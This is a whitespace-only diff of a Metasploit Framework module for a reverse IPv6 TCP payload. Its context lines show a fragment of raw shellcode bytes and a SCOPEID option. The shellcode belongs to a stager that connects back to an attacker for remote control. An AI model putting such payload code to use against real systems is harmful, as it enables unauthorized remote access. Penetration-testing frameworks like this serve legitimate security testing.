@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -22,7 +22,7 @@ module Metasploit3
 	def self.handler_type_alias
 		"reverse_ipv6_tcp"
 	end
-	
+
 	def initialize(info = {})
 
 		super(merge_info(info,
@@ -64,13 +64,13 @@ module Metasploit3
 						"\x02\x1b\x63\xff\xfe\x98\xbf\x36\x00\x00\x00\x00\x59\x6a\x1c\x51"+
 						"\x57\xff\x55\x20\x6a\x40\x5e\x56\xc1\xe6\x06\x56\xc1\xe6\x08\x56"+
 						"\x6a\x00\xff\x55\x0c\x89\xc3\x6a\x00\x56\x53\x57\xff\x55\x18\xff"+
-						"\xd3"					
+						"\xd3"
 				}
 			))
 		register_options(
 			[
 				OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
-			], self.class)		
+			], self.class)
 	end
 
 end
